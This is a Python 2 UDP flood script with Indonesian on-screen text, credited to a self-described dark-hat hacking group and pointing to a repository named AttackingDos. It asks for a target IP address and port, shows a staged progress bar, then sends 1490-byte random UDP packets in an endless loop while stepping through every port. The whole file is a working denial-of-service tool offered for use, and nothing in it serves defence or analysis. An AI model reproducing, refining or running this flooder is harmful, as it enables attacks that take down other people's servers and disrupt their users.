import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Mengirimkan Bug Bot")
print
print "CREATOR SC   : JAVA CHRISAND HECKA ANGGARA 666"
print "ORGANISASI   : HACKING DARK HAT YOGYAKARTA"
print "SC GITHUB    : https://github.com/ALUMINAUM/AttackingDos"
print "JABATAN      : PELAJAR HACKING REPUBLIK INDONESIA"
print
ip = raw_input("IP ADDRESS TARGET WEB : ")
port = input("PORT TARGET WEB      : ")

os.system("clear")
os.system("figlet MENGIRIMKAN BUG BOT")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Mengirim %s Bug Bot Linux66 %s Ke Port%s"%(sent,ip,port)
     if port == 65534:
       port = 1
